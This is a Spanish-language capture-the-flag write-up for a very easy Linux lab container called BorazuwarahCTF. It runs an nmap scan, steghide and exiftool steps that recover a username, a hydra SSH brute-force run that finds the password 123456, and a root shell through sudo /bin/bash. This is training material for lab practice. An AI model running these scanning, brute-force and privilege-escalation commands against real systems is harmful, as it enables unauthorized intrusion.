---
Maquina: BorazuwarahCTF
SO: Linux
Explotación: Análisis de imágenes
Escala_privs: Permisos sudo
Dificultad: Muy fácil
tags:
  - maquina
  - fuerza_bruta
  - analisis_imagen
  - linux
  - escala_privs
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2
```

![[Pasted image 20241019153105.png]]

2. **Ver la pagina web ubicada en el puerto 80**:

![[Pasted image 20241019153217.png]]

3. **Vamos a descargar la imagen y pasar una herramienta de análisis de la imagen**:

```bash 
steghide extract -sf imagen.jpeg 
```

![[Pasted image 20241019153408.png]]

Como se puede apreciar, la herramienta ha encontrado un archivo dentro de la propia imagen y el archivo contiene lo siguiente:

![[Pasted image 20241019153524.png]]

Así que vamos a intentar revisar mejor la imagen con otra herramienta:

```bash 
exiftool imagen.jpeg 
```

![[Pasted image 20241019153620.png]]

Aquí encontramos un nombre de usuario con lo que podemos pasar a intentar acceder al SSH mediante fuerza bruta.

## Explotación:

4. **Acceso al SSH por Fuerza Bruta**:

Con el usuario borazuwarah, vamos a intentar hacer un ataque de hydra para poder acceder al SSH

```bash 
hydra -l borazuwarah -P /home/alejandro/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt  ssh://172.17.0.2 
```

![[Pasted image 20241019154043.png]]

Listo, ya sabemos la contraseña del usuario borazuwarah -> 123456

![[Pasted image 20241019154520.png]]

Una vez dentro ya podemos pasar a la escala de privilegios.

5. **Escala de privilegios**:

Para ver los permisos que tenemos con el comando sudo podemos ejecutar:

```bash 
sudo -l
```

![[Pasted image 20241019154627.png]]

Como podemos apreciar se puede ejecutar /bin/bash como sudo.... Así que vamos a ejecutarlo.

```bash 
sudo /bin/bash
```

![[Pasted image 20241019154727.png]]